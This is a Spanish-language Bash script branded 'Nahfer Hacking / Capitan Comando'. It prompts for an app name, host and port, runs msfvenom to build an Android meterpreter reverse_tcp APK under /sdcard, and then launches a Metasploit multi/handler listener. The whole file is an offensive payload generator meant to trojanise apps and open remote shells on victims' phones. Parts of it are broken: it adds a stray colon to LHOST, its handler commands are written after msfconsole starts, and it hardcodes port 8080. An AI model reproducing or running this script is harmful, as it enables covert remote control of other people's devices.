#!/bin/bash

clear
setterm -foreground red
figlet "Nahfer"
figlet "Capitan Comando"
echo "
░░░░░░░░░░░║
░░▄█▀▄░░░░░║░░░░░░▄▀▄▄
░░░░░░▀▄░░░║░░░░▄▀
░▄▄▄░░░░█▄▄▄▄▄▄█░░░░▄▄▄
▀░░░▀█░█▀░░▐▌░░▀█░█▀░░░▀
░░░░░░██░░▀▐▌▀░░██
░▄█▀▀▀████████████▀▀▀█
█░░░░░░██████████░░░░░▀▄
█▄░░░█▀░░▀▀▀▀▀▀░░▀█░░░▄█
░▀█░░░█░░░░░░░░░░█░░░█▀
"
sleep 2.0
clear
figlet "Se Necesita" | lolcat -a
figlet "Metasploit"  | lolcat
figlet "Para su uso." | lolcat
sleep 2.0
clear
figlet "Payloand Inyeccion" | lolcat 
echo
echo "Creador: Capitan Comando." | lolcat -a
echo
echo "Nahfer Hacking." | lolcat -a
echo
echo "#######################################" | lolcat -a
echo
echo "Escribe El Nombre de la aplicacion." | lolcat -a
echo
read app
echo
echo "Escribe el Payloand o host." | lolcat -a
echo
read payloand
echo
echo "Escribe el Puerto del payloand o host." | lolcat -a
read port
echo
echo "Este Proceso Va a demorar, Espere un momento." | lolcat -a
sleep 2.0
msfvenom -p android/meterpreter/reverse_tcp LHOST=$payloand: LPORT=$port R > /sdcard/$app.apk

clear
figlet "Payloand" | lolcat
figlet "Creado" | lolcat 
echo
echo  "La Aplicacion Se Movio en el almanezamiento interno." | lolcat -a
echo 
echo "Enter Para entrar en modo de escucha."| lolcat -a
read 
clear

msfconsole

use exploit/multi/handler

set PAYLOAD android/meterpreter/reverse_tcp

set LHOST $payloand

set LPORT 8080

run
